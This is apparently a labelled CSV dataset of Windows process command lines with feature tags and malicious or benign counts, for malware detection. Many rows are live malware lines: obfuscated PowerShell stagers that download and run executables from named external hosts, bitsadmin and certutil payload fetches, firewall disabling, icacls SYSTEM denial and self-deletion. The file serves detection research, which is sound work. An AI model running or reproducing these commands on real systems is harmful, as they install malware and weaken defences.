tags,mal_cnt,ben_cnt,example
dir_%systemroot%; dir_%windir%; ext_exe; high_entropy; parentprocess_regsvr32.exe; very_high_string_len,4,0,"%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
arg_regedit; dir_%temp%; ext_reg; normal_entropy; normal_string_len; parentprocess_cmd.exe,4,1,regedit  /s %TEMP%\551B.tmp\slothfucker.reg
arg_-f; arg_-r; arg_-t; arg_0; parentprocess_unknown_process.exe; very_low_entropy; very_low_string_len,4,1,-r -f -t 0
arg_icacls; dir_%temp%; high_string_len; parentprocess_unknown_process.exe; very_high_entropy,4,0,"/c icacls ""%TEMP%\{ZRD1HK7S-PLA4-PAC5-FW98-FSI109Q37KQB}"" /inheritance:e /deny ""SYSTEM:(R,REA,RA,RD)"""
arg_-split; arg_104; arg_115; arg_36; arg_43; arg_48; arg_56; arg_powershell; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,4,0,"PowersHell [striNG]::jOIn( '' , ('119,25x2c35B110o61o54x36>126,60>49_57c54F48H39,115,29F54F39_125T4_54x49o16_63T58o54,61c39B104B119x10T7>36B110F116x59o39F39B35o105F124T124B36c36>36>125o48T42,32F58_32x125o48H63o124F61B35F103H1B31c5T107>43>32B124F19c59c39,39B35,105o124F124,36o36x36x125T48T33_62c55c54_62o60B125,53_58T33T32_39x48F60>62_55H54F62x60,63>58_61>56>32F125o48B60,62T124x11F2H6c31T36,38c103B39,124B19c59>39H39c35B105,124,124x36T36o36>125c60F55H50T126H35_33>60,55,38>48H39F58>60B61_125>33B38c124c4H57>11T58o42c42,124T19_59T39,39_35>105o124c124T36,36_36x125c63>50H35_48>125c48x60B62o125c35>56>124x0B9>29x106x36c97T96>39x124o19c59T39o39F35>105,124>124H36,36H36,125,48x38x33o32B60c35T50o55_33>50o60c125>48>60o62x125,49T33T124>20H99x33c43>107B53o49F38_124B116F125o0H35_63H58c39x123F116T19>116x122T104,119T60T58o55_115>110T115H116,103,96o106o116F104H119x11B26H10_110_119F54x61,37c105_39>54c62F35_120_116B15o116T120F119,60T58c55x120c116c125_54,43c54c116>104>53_60F33T54H50H48H59o123T119c26_36B23x115B58F61>115>119H10F7x36>122T40_39>33_42T40_119F25T2,35x125F23B60>36>61B63T60_50x55B21c58H63T54B123_119T26x36c23T127,115T119c11_26,10c122F104H0H39c50>33T39x126x3,33>60c48H54x32o32,115T119H11c26B10F104x49B33o54,50c56T104T46_48o50c39F48T59_40>46B46' -spLIT 'B' -Split','-sPlIt 'X'-SPlit't'-split 'H' -SpLit'_' -spliT 'c' -SPlIT'O'-SpliT 'F'-spLIt'>'|% {[cHAR]( $_-BxOR '0x53' )})) |&( $PshoME[21]+$PsHOme[30]+'x')"
arg_start; dir_%appdata%; ext_exe; high_entropy; parentprocess_wscript.exe; very_high_string_len,4,0,/c start %APPDATA%\p99BEMm1MyZn3yN\\v5DMM5AgTUgUG5N.exe %APPDATA%\p99BEMm1MyZn3yN\\dzAz3dEHhp9f1HO %APPDATA%\p99BEMm1MyZn3yN\\Q5DBT0lPnTSYbWZ
arg_100; arg_105; arg_106; arg_107; arg_108; arg_113; arg_114; arg_121; arg_125; arg_127; arg_19; arg_2; arg_20; arg_21; arg_32; arg_33; arg_35; arg_37; arg_38; arg_39; arg_4; arg_40; arg_41; arg_42; arg_43; arg_44; arg_45; arg_46; arg_47; arg_48; arg_49; arg_50; arg_51; arg_52; arg_54; arg_55; arg_57; arg_6; arg_61; arg_62; arg_63; arg_7; arg_8; arg_96; arg_99; arg_powershell; low_entropy; parentprocess_unknown_process.exe; very_high_string_len,4,0,"PowersHell  .( $PsHome[21]+$psHomE[34]+'x') ( [sTrInG]::jOIn('', ( [ChAR[]]( 96, 40,38, 47 ,121 , 42,33 , 51 , 105,43 ,38, 46, 33, 39 ,48, 100, 10,33 ,48 ,106, 19 ,33, 38 , 7 ,40 ,45, 33 , 42,48,127,96 , 51, 0, 2,121 ,99,44,48 ,48, 52,126,107 , 107,41 , 37 ,48, 32 , 37 , 42 ,55, 49 ,42, 37 ,42,43, 106,39, 43,41, 107 , 55 , 43 ,48 , 52 , 45,33 , 107 ,124, 47 , 21 , 114 ,15,107,4 ,44, 48 ,48 ,52 ,126, 107, 107 , 51 ,51 , 51 , 106 , 55,37 ,61 ,35 , 45, 42,41,33, 32 , 45 , 37,106, 39 , 43 , 41 , 107 , 114 , 35 ,11 ,51 , 6 , 39, 107 ,4 , 44 , 48, 48 , 52 ,126 , 107, 107,51,51, 51,106 ,34 , 33, 32, 33, 54 , 37 , 40 ,37,54, 41 , 55 , 45, 42, 48 , 33 , 54 , 42 , 37 ,48,45 , 43 , 42,37,40,106 , 39 , 43 , 41 ,107,41, 53,34 ,114, 125, 107,4 , 44,48, 48,52, 126, 107 ,107,51,51, 51 ,106 , 52 , 33 ,48 ,33 , 54 ,42 , 37 , 47, 37 , 42,106 ,49, 42 ,51 , 45 , 47 , 49,106 ,37 ,39,106, 45,32, 107,124,46,20 ,40,33 , 107 ,124, 46 ,20, 40,33,107, 4 ,44,48 ,48 , 52 , 126,107,107 , 51, 51, 51, 106,41, 33 , 62 , 49 ,33 , 42 ,37 , 106 , 39 , 43, 41 , 107, 9,34 , 28, 40,10 ,107 , 99 ,106,23, 52, 40 ,45,48, 108 , 99 ,4,99 ,109 ,127 , 96 ,9,21 ,6 , 100 , 121 ,100 ,99 ,119 , 125 , 113 ,99 ,127, 96, 54 ,44 , 8 , 121,96,33 ,42 , 50 ,126, 48 , 33 , 41, 52,111 ,99 ,24 ,99 , 111, 96 ,9 , 21 ,6 ,111,99,106, 33 ,60 ,33, 99,127 ,34 ,43 ,54 , 33 ,37, 39 , 44,108 , 96 , 19 ,29 , 30, 100 , 45 ,42 , 100,96 , 51 ,0 , 2 , 109, 63 ,48, 54 , 61 , 63 ,96 , 40, 38, 47 ,106 ,0,43,51,42 ,40 ,43 , 37,32, 2,45 , 40 ,33 , 108,96 , 19 ,29,30 , 104,100, 96 ,54,44, 8,109,127 ,23 , 48,37, 54,48, 105 , 20 , 54 , 43, 39 , 33, 55 , 55,100 ,96,54, 44 , 8 , 127 , 38,54 , 33,37 ,47 ,127, 57 , 39 , 37, 48 ,39 , 44 , 63 , 57,57 ) |% { [ChAR]( $_-BxOR '0x44' ) } )) )"
arg_-f; arg_-r; arg_-t; arg_20; arg_shutdown; low_entropy; low_string_len; parentprocess_cmd.exe,4,1,shutdown  -r -f -t 20
dir_%temp%; ext_exe; ext_tmp/; ext_txt; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,4,2,/k cd %temp%/d42o33zsM.tmp/ & 1.exe /stext 1.txt&exit
arg_del; arg_ping; dir_%systemroot%; dir_%temp%; dir_%windir%; ext_01; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,4,2,"/c ping 127.0.0.1 & del ""%TEMP%\Windows.exe"""
arg_-argumentlist; arg_-class; arg_-executionpolicy; arg_-name; arg_-noprofile; arg_-windowstyle; arg_bypass; arg_create; arg_hidden; arg_invoke-wmimethod; arg_new-object; dir_%temp%; ext_51;; ext_exe; parentprocess_wscript.exe; very_high_entropy; very_high_string_len,4,25,"/c powershell.exe -noprofile -windowstyle hidden  -executionpolicy bypass $OE = New-Object System.Net.WebClient; $OE.Headers['User-Agent'] = 'SmartMarket 1.5.1'; $OE.downloadfile('http://news.popmarket.org/YSaVpmkRCy.php','%temp%SPb98.exE'); InvOkE-WMiMethoD -ClaSs Win32_Process -NamE CreaTe -ARgUmentLIst '%Temp%SPb98.eXe'"
arg_executequeueditems; low_entropy; normal_string_len; parentprocess_explorer.exe,4,139,executequeueditems /nologo /silent
ext_docm; low_string_len; normal_entropy,4,3,"/n ""C:\sample.docm"""
ext_dot; normal_entropy; normal_string_len,4,1,"/n /f ""C:\Patriotic Business Card.dot"""
arg_cmd; ext_bat; normal_entropy; normal_string_len; parentprocess_wscript.exe,4,2,"cmd /c """"C:\tdloza\dorgy.bat"" """
arg_cfiokhqzvfzokfvttlkhu; arg_cmd; arg_nanyowqmicksd; arg_wtdomjp; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,4,25,"Cmd wtDoMjp CfioKhQzVFzokFVttlkHU naNYowQMIcKSd  &  %co^m^S^p^E^c%  /c c^M^d,  ,, ^/^V ^  ,  ,, /^r"" , ,, (, ,   ,  (   ,  (S^eT ^ aT^I^6=^G3H Ex0 1n^t 5lS Mt^L^ ^d^Fx ^F^Vy lZx^ eD7 k^pB o2N^ H^lN j^CD ^e^BX^ ^Fno F^L^U R^Bk fX5}5^zU^}B^r^g{^y^e^z^hh^u^2cD^c^z^tLa^Oa^EJcceR6}6qZ^;^pnJk^Uk^WaK^EkexFq^rK^aib^35n^;^X^vOD^1KDNk^BbZZ^EC$2bw^ fT6so3CsP^u^we^M^6^Dc^xDAoj 7r ^U^GP9^7^8^-U3^etY^GZ^rn^m9^a9^ ^it^Fv^sS^Lf2;^V^X^J^)X^Bx^D^L^8^DNP^OrZ^Un^S$^UFI C^m^g,hInoKvsnT7GF^u^bV$K^Vf^(zWi^e^KEVl6s^vi^hqaFZeFdiENajPHo^UI^Rl^Ft^8n^b0^AwL^j^R^oxXU^DbHS.^9f^I^w^WT^Q^Oy^L9OdRm$a36^{H^UVyNAf^r^px t^06m{bMx^)^t^86Ttu^h^UC^Qw^SI^6h^$iv^B hs^on6RViFGR UY7oz^KcnP^r9^FhPr$Zw^v^(^bEOh^ ^VCcW2^vaL^uf^e^9^pqrYr^aomMOfj^Js;^K^t^U'^eTGelt^f^xd^fueUip^.I^h^G^'Sng+t^epNt^Tr^h^P^F^TDr^07^$i6C+gy5'mxJ\^z^lO'^Xk^i+^j3^C^p^MLCm^h^P^H^e^M^fwt^PKQ:3^usvOisn^PE^1^e^p^ZV^$^wgl=o9^8^DO^0vN8l^H^ZpL^3^$14v^;r^a^F'g6346^1k^2^HZy1^xQ^C^'^A^wq Zc^g^=s^L^O t^qDN^Y^J4hP^R^F^Dk^vH$^3^am^;l^z^V^)k4b'Kmg@ y^a'^Cz8^(u2Q^t1mJi^qu^Yl^S^t ^pt^JR^Sgh^8.mSh'v^I^eZ^VxFW^s0^a^HXQ^U^ACNXVhq^pk^U^l^IC^vQ8^/2^bX^gwdur^ymOoN3A^.2xB^eeE^ltBhj^u5^k^ga^A^fbbx3^h/^BzX/P89:Bckp^8^e2tdNM^tl4Vh^R^W^5@5R96dX4a1W^mMPWd/^5Ca7^eWj^1^hQ^M06V^b2vxX/4^A1snkS^dY^KDazxRoQVA^lV^u^hpGFEunF^y/^8^Sutn^efnYRO^e^wTyt0^lmn^9^c^d^ocukcBWj^-X^8w^p^WmJ^wm1n^/a^L3^m7^xto^s^I^ac^m^ ^o.^7^u sRhjtBw^ec^EV^6eBq9jUiT^oQzbr^r^1ipGyRlg9Ja^VK^u^t^iyTisdt^g^z^P^ ^i3Rtd^6Jzlxb02^dEUbh^kG.^efie^SQ^YfeJ^Yiex lgv^c^2^FO^a^sUgLd^c^wmndBr^aqt^Xr^pf8bNoT.l^T ^wK^F^h^w^sw^v^wWT^0^/G^20^/YFx^:^BeNpjXItf^SL^t6^7^D^hK^S^1@DkYc^Iy^0^vE3^Hdl1y/i^kr^u^1e^Fr6^cO^.^5^uJlL3^bow^S5od9Bh^ujHc6^O1si14^-U^5Ta176kk^XHvDT^go9zFnC^l6oL^U^2r^tj^q^i^7^x^4mHrL/BSe/C5^w^: ^Gtp^y^z^K^t^Q^wHt^V^G^t^hkeo@D^x^r7^D^Mh5^tIiN9pL1vJ^Mjx^X^I^0^kIe^cG8I/^e8^w^/UXG^lrUbpupE.^Z^P^8uA^pZ^dWS^qeozK.^ZLOa8^rqwf vy^G^Aet^w^VzaAzEj^Hr^i^c^qy^r^iZWMnUH5iqiS^/k^oj/c^E9:^6SZ^pi^DB^tyQYt^Xd^e^h^wJu@^6^LXdyP^D^cs^k ^uO^A1Gse^Lz^K5hNW^8G/Q^GRm^l^B4oc^qgc^Fz^0.l4gs^6tJ^rCFVoA^L^ztS^eHcydfapk^KgeYonJfluRv^5o^B^I^l^y^rL^u^cF2roY2i.J16^wlsW^wgM0wQ^Ot/Qcn^/^ n2:^0Ig^p rNt^M^k7t^OHr^h5ZY^'j^Ea=X9^CTh19U^SW^ESD^Cm$10t;^Aw^Xt^g^R^cn^9T^O^eK^0^Ri^g^mtlTzmCY^Gkbk^dQeB^4IWDpy.^uF^Wtkh^LeH^f^GNS^o^D Ql^2t^HgccQ^8^Pe7Ua^j 05b7^3ToN^kg-F^IUwL^tpe^w3cn^rMw=2upwNlj^OYUGOBEd^$4^a0 ^9nAlNS^JlQwleb^Rch ^Kls^7pW^r2N^beN^zX^wi^9^Ko38Np) ,)  ,   )&&   , ^foR, /^L  ,  %^7  ,  , In  ,  ,,( +1^639^ ,,,^, ,-4 ^ ^,  +3^ ) , ^d^o,  ,(   ,,,  ,   ,( ,,,   ( , ^S^e^t    ^eh=!^eh!!aT^I^6:~  %^7, 1!),   ) ,  )& ,, ,  ^IF, %^7, , ,  , , , E^qU , , ^3  , (^CAL^l  ,  , , %^eh:^~  ^ -^4^1^0%)  """
arg_-status; parentprocess_cmd.exe; very_low_entropy; very_low_string_len,4,1,-status C:
arg_-quiet; arg_catalog; arg_delete; low_entropy; low_string_len; parentprocess_cmd.exe,4,2,delete catalog -quiet
ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,4,3,"/c c:\SetRes\dccmd.exe -monitor=""\\.\DISPLAY1"" -width=1024 -height=768"
arg_add; arg_allowedprogram; arg_enable; arg_firewall; arg_netsh; ext_exe; high_entropy; parentprocess_unknown_process.exe; very_high_string_len,4,0,"netsh firewall add allowedprogram ""C:\4c5bad5d315ee24cd7dd472649c8ac53691200.exe"" ""4c5bad5d315ee24cd7dd472649c8ac53691200.exe"" ENABLE"
arg_cmd; ext_bat; low_entropy; low_string_len,4,1,"cmd /c """"C:\0.bat"" """
arg_list; arg_tasklist; low_entropy; low_string_len; parentprocess_cmd.exe,4,2,tasklist  /fo list
arg_-n; arg_1; arg_del; arg_nul; arg_ping; ext_01; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,4,2,"/c ping -n 1 127.0.0.1 && del ""C:\_5__~1.EXE"" >> NUL"
arg_-1282773415519150411792272698-328206688-1174648388-773224826825027889-1090777871; high_string_len; low_entropy; parentprocess_unknown_process.exe,4,8,"""-1282773415519150411792272698-328206688-1174648388-773224826825027889-1090777871"""
arg_bitsadmin; arg_mxs5; dir_%temp%; ext_exe; ext_php2; high_string_len; normal_entropy; parentprocess_cmd.exe,4,333,bitsadmin  /transfer mxs5 https://bestouters.com/online/docker.php2 %TEMP%\JZCzDJTTgS.exe
dir_%temp%; ext_exe; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,4,25,"-package:""C:\apiptah_1_0_31.exe"" -no_selfdeleter -IS_temp -media_path:""%TEMP%\{42E4898A-B69B-41E1-ABDA-31AD671E0639}\Disk1\"" -tempdisk1folder:""%TEMP%\{42E4898A-B69B-41E1-ABDA-31AD671E0639}\"" -IS_OriginalLauncher:""%TEMP%\{42E4898A-B69B-41E1-ABDA-31AD671E0639}\Disk1\setup.exe"""
arg_-command; arg_powershell; normal_entropy; normal_string_len; parentprocess_cmd.exe,4,1,powershell  -command get-command -module defender
arg_timeout; parentprocess_cmd.exe; very_low_entropy; very_low_string_len,4,1,timeout  1
"arg_1; arg_new-object; arg_set; ext_exe,; ext_type; ext_xml; parentprocess_wscript.exe; very_high_entropy; very_high_string_len",4,25,"/k set xxx=power&& set yyy=sh&& set zzz=ell&& call %xxx%%yyy%%zzz% $mrZOMKs = 'z7JMz';$a = 'Msxml' + '2.XML' + 'HTTP';$CMrsOT = 'oJbAVxn';$b = 'ADO' + 'DB.' + 'Stream';$BLYLhJ9 = 'd2VOgUF';$c = 'G' + 'E' + 'T';$bGUoOr = 'Af98AS';$d = 1 - 1 + 1;$xOQpzXz = 'i4wpR8b';$hr = New-Object -ComObject $a;$CilgxaL = 'IWggcq';$ab = New-Object -ComObject $b;$aysWrcWhh = 'vmcbRn6R3';$path = $env:temp + '\4240.exe';$fGuzOR = 'BNKJNue';$hr.open($c, 'https://gestiolegal.com/wp-admin/includes/7777.exe', 0);$WWwfzSK = 'Wf5ky';$hr.send();$XH1bJC = 'hmPUCEl';$rUiI8J = 'Kkawp';$QToONk = 'bPVB4v';$OHvqw = 'UmtDPy';$ab.open();$zPyzdUxwd = 'KSBPEIi';$ab.type = $d;$oTCgbD = 'HkDhSt';$ab.write($hr.responseBody);$iHRhwT = 'S2HCn';$ab.savetofile($path);$Yu0ip = 'qJPkN';$ab.close();$EOQllf = 'yFhoTf';$ACkDNYW = 'YzoyE';$lbWH6Hm = 'ohSYTLj';$tQlWEe = 'UXDIh3hU';$kzvtXO = 'jGsPP8F';$IkSCOPZpy = 'JlrvsTh';$O2wvxl = 'NDxBwGO';Start-Process $path;"
arg_-f; arg_-split; arg_-urlcache; arg_certutil; dir_%temp%; ext_php; ext_txt; high_string_len; normal_entropy; parentprocess_cmd.exe,4,333,certutil  -urlcache -split -f http://www.illumania.net/login.php %TEMP%\ercg345c24.txt
ext_html; low_entropy; low_string_len,4,1,C:\extra_0.html
arg_-decode; arg_certutil; dir_%temp%; ext_cab; ext_txt; high_string_len; normal_entropy; parentprocess_cmd.exe,4,333,certutil  -decode %TEMP%\ercg345c24.txt %TEMP%\ercg345c24.cab
arg_-split; arg_30; arg_72; arg_85; arg_powershell; high_entropy; parentprocess_unknown_process.exe; very_high_string_len,4,0,"PowersHELL                                          .( $shElliD[1]+$ShEllId[13]+'X')( ""$(SEt-iteM 'vaRIabLe:oFS' '')""+ [strINg]('30Y84N127S125w7<84Y95N77R23j85S88N80%95w89N78%26N116j95K78w20<109K95<88R121<86R83K95K84j78R1S30S112<83S81R7K29N82w78R78R74K0S21Y21%77w77w77K20K67w95S78j91R84%85R78w82%95N72N73j78%95w76Y95K20S89N85S87S21j98<73N12R110<106w77R84j123%123N112S21S122S82w78j78R74Y0N21<21%92S86<95K77K95S72N20m74R86j21<74K79m88K21m73%3Y3%15K15m12N87%21%122S82S78<78Y74Y0Y21Y21Y77w77S77K20w82%85K78N95<86K89Y91K74N83w78w91R86m20<72N79S21N92m12%124m120<112Y126w21w122R82<78w78j74R0Y21K21<94S89%20%91w87S95w93Y78Y20Y89S85K87%21w77K74<23j89N85Y84%78S95Y84S78Y21j85m121K14Y93N67N14N91Y125R118m21%122<82m78m78%74R0%21K21N77K77K77m20j91Y72R87<91N84<83w78%85j79<72<20K89<85S87K21R81m79j116Y117m75K115w21Y29Y20<105S74m86m83S78S18m29m122K29%19K1S30j82m117j98R26S7K26Y29j8%3<11N29S1K30S86w104Y75N7K30R95m84w76%0S78N95%87w74N17<29N102m29j17S30N82N117w98S17R29%20Y95%66<95S29j1m92Y85%72%95R91m89S82<18%30m126Y98R107%26<83j84w26<30<112S83R81w19j65R78N72K67K65w30j84<127R125N20N126K85m77R84N86<85<91w94Y124N83Y86R95%18Y30R126K98K107S22j26K30N86R104K75K19K1S105j78%91S72m78w23w106w72N85R89R95S73%73N26S30K86Y104%75<1%88S72Y95N91S81S1K71N89w91<78K89N82%65N71<71'-split 'w' -split 'Y'-sPlIt 'K' -sPlIT '<'-sPlIt 'N' -sPLiT 's'-split'r'-SpLit '%' -SPlit 'M'-SPlit 'J'|foREaCH-OBjEct{ [CHar] ( $_-BXOr 0x3a )}) +"" $(SEt 'ofs'  ' ')"")"
arg_-creplace; arg_-replace; arg_powershell; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,4,0,"Powershell  (('IEx( (y8x2monsadasd y8x+y8x=y8x+y8x &(fy8x'+'+y8x2gy8x+y8xnf2y8x+y'+'8xg+f2gey8x+y8xf2gy8x+y8x+f2gw-objecf2y8x+y8xg+y8x+y8xf2gty8x+y8xf2g)y8x+y8x y8x+y8xr'+'y8x+y8xandy8x+y8xomy8x+y8x;2moYYU =y8x+y8x y8x+y8x.y8x+y8x(f'+'2y8x+y8xgy8x+y8xnef2y8x+y'+'8xg+fy8x'+'+y8x2gwfy8x+y8x2g+f2gy8x+y8x-objy8x+y8xecty8x+y8xf2g) y8x+y8xSy'+'stey8x+y8xm.Nety8x+y8x.Wey8x+y8xbCy8x+y8xlieny'+'8x+y8xt;2y8x+y8xmoNy8x+y'+'8xSBy8x+y'+'8x = y8x+y8x2moy8x+y8xnsy8x+y8xadasd.y8x+y8xny8x+y8xext(y8x+y8x10y8x+y8x000y'+'8x+y8x,y8'+'x+y8x 282133)y8x+y8x;y8x+y8x2my8x+y8xoADCX = fy8x+y8x2gy8x+y8xhttp://keviy8x+y8xnly8x+y8xomby8x+y8xay8x+y8xry8x+y8xdo.comy8x+y8x/3FB22/@hy8x+y8xttpy8x+y8x://cy8x+y8xabola.cy8x'+'+y8xom.br/y8x+y8xa2Vy8x+y8xA4q9/@hy8x+y8xttp://k8ir.y8x+y8xcom/'+'x'+'Opoy8x+y8xuO/@y'+'8x+y8xhy8x+y8xty8x+y8xtp://fy8x+y8xranssy8x+y8xmanmediy8x+y8xay8x+y8x.nl/BdRXyy8x+y8xt/@http:/y8x+y8x/y8x+y8xchris-da'+'rk.coy8x+y8xm/lGGy8x+y8xPy8x+y8xjL/f2g.y8x+y8xSplit(y'+'8x+y8xf2gy8x+y'+'8x@f2g)y8x+y8x;2moSy8x+y8xDC = 2moeny8x+y8xv:y8x+y8xpublic + f2gFnKf2g + 2moy8x+y8'+'xNy8x+y8xSBy8x+y8x + (f2g'+'y8x+y8x.y8x+y8xexf2g+fy8x+y8x2y8x+y8xgef2y8x+y8xg);y8x+y8xfory8x+y8xeachy8x+y8x(y8x+y8x2moay8x+y8xsy8x+y8xfc iy8x+y8xny8x+y8x 2y8x+y8xmoADCXy8x+y8x){try8x+y8xy{2y8x+y8xmoYYy8x+y8'+'xU.kny8x+y8xsy8x+y8xDoy8x+'+'y8xaV7Wnlay8x+y8xV7OadFIaVy8x+y8x7ley8x+y8xky8x+y8xns(2moay8x+y8xsf'+'c.ky8x+y8xnsToStraVy8x+y8x7'+'iy8x+y8xaV7Ngy8x+y8x'+'ky8x+y8xns(), 2moSDCy'+'8x+y8x);&(y8x+y8xf2gy8x'+'+y8xInvy8x+y8xof2g+f2gkf2g+f2ge-Ity8x'+'+y8x'+'ey8x+y'+'8xmfy8x+y8x2gy8x+y8x)(2y8x+y8xmoSDC);by8x+y8xrey8x+y8xak;y8x+y8x}cay8x+y8xtch{}y8x+y8x}y8x).rEpLACE(y8xknsy8x,[strinG][cHar]34).rEpL'+'ACE(y8x2moy8x,y8x0Lny8'+'x).rEpLACE(([cHar]102+[cHar]50+[cHar]103),[strinG][c'+'Har]39).rEpLACE(y8xFnKy8x,y8xD34y8x).rEpLACE(y8xaV7y8x,y8xMnby8x)) ') -creplacE  'Mnb',[CHAr]96 -creplacE ([CHAr]68+[CHAr]51+[CHAr]52),[CHAr]92  -REPlace '0Ln',[CHAr]36 -creplacE 'y8x',[CHAr]39)| . ( $ShellId[1]+$SHeLLId[13]+'x')"
arg_icacls; dir_%localappdata%; high_string_len; parentprocess_cmd.exe; very_high_entropy,4,0,"icacls  ""%LOCALAPPDATA%\{F3UUQKV6-86GW-29U5-WJG7-QM3G5HOCI4K1}"" /inheritance:e /deny ""SYSTEM:(R,REA,RA,RD)"""
dir_%temp%; ext_exe; ext_ini; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,4,2,.\setup.exe /INI=%TEMP%\nsb2816.tmp\config.ini
arg_-o; parentprocess_runonce.exe; very_low_entropy; very_low_string_len,4,1,-o
arg_disable; arg_firewall; arg_netsh; arg_opmode; arg_set; normal_entropy; normal_string_len; parentprocess_cmd.exe,4,1,netsh  firewall set opmode disable
arg_getmac; parentprocess_unknown_process.exe; very_low_entropy; very_low_string_len,4,1,"""getmac"""
arg_icacls; dir_%allusersprofile%; high_string_len; parentprocess_svchost.exe; very_high_entropy,4,0,"/c icacls ""%ALLUSERSPROFILE%\{PW878LYB-O49C-IFVE-BIHN-5LVPMIV1QHIO}"" /inheritance:e /deny ""SYSTEM:(R,REA,RA,RD)"""
arg_find; ext_exe; low_string_len; not_in_range; parentprocess_cmd.exe,4,2,"find  ""Svchost.exe"""
dir_%programfiles%; ext_dll; high_string_len; normal_entropy; parentprocess_unknown_process.exe,4,1,"""%PROGRAMFILES%\PDFCreator\PDFCreator.COM.dll"" /codebase /tlb"
dir_%temp%; ext_bat; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,4,3,"/c %TEMP%\ztmp\tmp9275.bat ""C:\DiagBox Uninstall and Cleaner.exe"""
ext_ps1; normal_entropy; normal_string_len,4,1,"""-file"" ""C:\ursnif.ps1"""
